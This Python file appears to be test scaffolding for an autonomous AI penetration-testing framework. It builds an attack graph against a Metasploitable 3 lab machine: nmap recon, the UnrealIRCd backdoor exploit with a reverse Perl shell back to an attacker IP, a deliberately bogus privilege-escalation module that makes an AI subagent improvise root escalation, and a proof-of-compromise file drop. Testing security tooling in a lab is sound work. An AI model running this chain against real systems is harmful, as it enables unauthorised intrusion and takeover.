"""
Example Attack Graph: DELIBERATELY FLAWED at PRIVESC (Metasploitable 3)

This graph is correct everywhere EXCEPT the privilege-escalation stage, which
is wrong on purpose, to exercise the direct->subagent fallback specifically at
PRIVESC:

  1. recon and gain_access are GOOD. gain_access uses a proven working lander
     against MS3 -- the UnrealIRCd 3.2.8.1 backdoor on port 6667
     (exploit/unix/irc/unreal_ircd_3281_backdoor) with a cmd/unix/reverse_perl
     payload. This reliably opens a command shell, so the chain reaches the
     escalate node with a live session.

  2. THE FLAW: the escalate node prescribes a BOGUS, nonexistent local-exploit
     module -- exploit/linux/local/this_module_does_not_exist_priv_esc. The
     direct (prescribed-module) execution path cannot load/run this module, so
     it fails fast. In explore mode this triggers the direct->subagent FALLBACK:
     the PRIVESC stage subagent must take over and improvise a real escalation
     (enumerate sudo, SUID, kernel exploits, cron, capabilities, writable
     configs, docker group, etc.) from the existing session.

  3. Expected adaptation: when the bogus module fails, the orchestrator routes
     escalate to the privesc subagent, which honestly enumerates and attempts
     viable privesc vectors against MS3. Whether or not it reaches root, the
     judge/replanner can then decide whether to proceed to file_drop. The point
     of this scenario is to confirm the privesc-stage fallback fires when the
     prescribed local-exploit module is invalid.

Run with explore=True so the direct->subagent fallback is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flaw_privesc_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, escalate privileges, and drop "
                  "a verified proof-of-compromise file. (This plan is "
                  "intentionally flawed at the privilege-escalation stage: the "
                  "prescribed local-exploit module is bogus/nonexistent, so the "
                  "direct path must fall back to the privesc subagent.)",
        target_ip=target_ip,
        name=f"flaw_privesc_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally-flawed-at-privesc chain to test direct->subagent fallback at the privesc stage.",
        metadata={"scenario": "flaw_privesc_fallback", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        tags=["recon"],
    ))

    # GOOD: proven working lander -- UnrealIRCd 3.2.8.1 backdoor on 6667.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. "
                  f"LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4463},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE FLAW: bogus/nonexistent prescribed local-exploit module. The direct
    # path fails -> fallback to the privesc subagent.
    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate Privileges (BOGUS module on purpose)",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the compromised session to root",
        objective="From the existing session, escalate to root. (The prescribed "
                  "local-exploit module is bogus/nonexistent; if it fails, "
                  "enumerate AND exploit any viable privilege-escalation vector "
                  "-- sudo, SUID, kernel exploit, cron, capabilities, writable "
                  "config, docker group -- to obtain a root shell. Verify with "
                  "id/whoami showing uid=0.)",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/linux/local/this_module_does_not_exist_priv_esc",
        module_options={"SESSION": "1"},
        max_retries=2,
        tags=["privesc", "escalation", "flaw_bogus_module"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written-and-verified artifact",
        objective="Write a proof-of-compromise file to "
                  "/tmp/pwned_flaw_privesc.txt via the session, then read it "
                  "back to verify the write succeeded.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_flaw_privesc.txt",
            "marker": "PWNED via flaw_privesc scenario",
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_flaw_privesc.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )

    graph.connect(
        "gain_access", "escalate",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A command shell session was opened")],
        evidence="Initial command shell established",
        rationale="Escalate privileges from the new session",
    )

    graph.connect(
        "escalate", "file_drop",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A usable session is available")],
        evidence="Privilege-escalation stage completed (via subagent fallback)",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_flaw_privesc_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/flaw_privesc_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
